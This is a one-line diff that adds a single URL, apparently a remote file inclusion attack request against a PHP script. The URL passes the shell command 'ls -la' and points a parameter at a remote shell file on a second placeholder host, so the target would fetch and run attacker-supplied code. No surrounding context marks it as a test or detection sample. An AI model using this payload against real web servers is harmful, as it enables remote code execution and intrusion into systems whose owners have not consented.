@@ -1,0 +1,1 @@
+http://www.example.com/somescript.php?cmd=ls%20-la&amp;xpl=http://www.example2.com/someshell.txt
